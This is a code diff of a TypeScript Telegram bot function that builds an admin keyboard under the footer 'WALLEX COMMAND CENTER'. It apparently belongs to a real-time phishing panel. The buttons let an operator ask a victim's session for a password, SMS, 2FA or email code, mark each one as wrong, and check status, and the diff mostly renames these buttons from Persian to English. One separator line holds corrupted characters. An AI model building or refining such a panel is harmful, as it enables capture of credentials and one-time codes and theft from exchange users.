@@ -954,98 +954,83 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   const buttons = [];
 
-  // 🎯 ROW 1: Primary Authentication Methods (Main Actions)
-  const primaryAuthRow = [];
+  // 🎯 ROW 1: Quick Authentication Actions (Compact & Professional)
+  const quickAuthRow = [];
 
   if (!session.authAttempts["password"]) {
-    primaryAuthRow.push({
-      text: "🔐 رمز عبور",
+    quickAuthRow.push({
+      text: "🔐 PASS",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
   }
 
-  primaryAuthRow.push({
-    text: "📱 کد SMS",
+  quickAuthRow.push({
+    text: "📱 SMS",
     callback_data: `auth_sms_${sessionId}`,
   });
-  console.log("✅ Added SMS Code button");
+  console.log("✅ Added SMS button");
 
   if (!session.authAttempts["google"]) {
-    primaryAuthRow.push({
-      text: "🔒 احراز دومرحله‌ای",
+    quickAuthRow.push({
+      text: "🔒 2FA",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added 2FA button");
   }
 
-  if (primaryAuthRow.length > 0) {
-    buttons.push(primaryAuthRow);
-  }
-
-  // 🎯 ROW 2: Secondary Authentication Methods
-  const secondaryAuthRow = [];
-
-  secondaryAuthRow.push({
-    text: "📧 کد ایمیل",
+  quickAuthRow.push({
+    text: "📧 EMAIL",
     callback_data: `auth_email_code_${sessionId}`,
   });
-  console.log("✅ Added Email Code button");
+  console.log("✅ Added Email button");
 
-  if (secondaryAuthRow.length > 0) {
-    buttons.push(secondaryAuthRow);
+  if (quickAuthRow.length > 0) {
+    buttons.push(quickAuthRow);
   }
 
-  // 🎯 ROW 3: Error/Wrong Actions (Only if attempted)
-  const errorActionsRow = [];
+  // 🎯 ROW 2: Error Actions (Smart Grouping)
+  const errorRow = [];
 
   if (session.authAttempts["password"] && session.authAttempts["password"] > 0) {
-    errorActionsRow.push({
-      text: "❌ رمز اشتباه",
+    errorRow.push({
+      text: "🚫 PASS",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
   }
 
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
-    errorActionsRow.push({
-      text: "❌ کد 2FA اشتباه",
+    errorRow.push({
+      text: "🚫 2FA",
       callback_data: `incorrect_google_${sessionId}`,
     });
     console.log("✅ Added Wrong 2FA button");
   }
 
-  errorActionsRow.push({
-    text: "❌ کد SMS اشتباه",
+  errorRow.push({
+    text: "🚫 SMS",
     callback_data: `incorrect_sms_${sessionId}`,
   });
-  console.log("✅ Added Wrong SMS button");
 
-  if (errorActionsRow.length > 0) {
-    buttons.push(errorActionsRow);
-  }
-
-  // 🎯 ROW 4: Email Error Actions
-  const emailErrorRow = [];
-
-  emailErrorRow.push({
-    text: "❌ کد ایمیل اشتباه",
+  errorRow.push({
+    text: "🚫 EMAIL",
     callback_data: `incorrect_email_code_${sessionId}`,
   });
-  console.log("✅ Added Wrong Email Code button");
+  console.log("✅ Added Wrong SMS & Email buttons");
 
-  if (emailErrorRow.length > 0) {
-    buttons.push(emailErrorRow);
+  if (errorRow.length > 0) {
+    buttons.push(errorRow);
   }
 
-  // 🎯 ROW 5: Status Check (Always available)
+  // 🎯 ROW 3: System Control (Professional Management)
   buttons.push([
     {
-      text: "🔍 بررسی وضعیت کاربر",
+      text: "📊 STATUS",
       callback_data: `check_status_${sessionId}`,
     },
   ]);
-  console.log("✅ Added Status Check button");
+  console.log("✅ Added System Status button");
 
   // Note: Approve & Grant Access button removed - admin handles completion manually
 
@@ -1587,7 +1572,7 @@ const formatSessionMessage = (session: UserSession): string => {
   // Simple footer with session info
   message += `\n\n🆔 Session: <code>${session.sessionId.substring(0, 10)}</code>
 
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬���▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 <i>🔐 WALLEX COMMAND CENTER</i>`;
 
   return message;
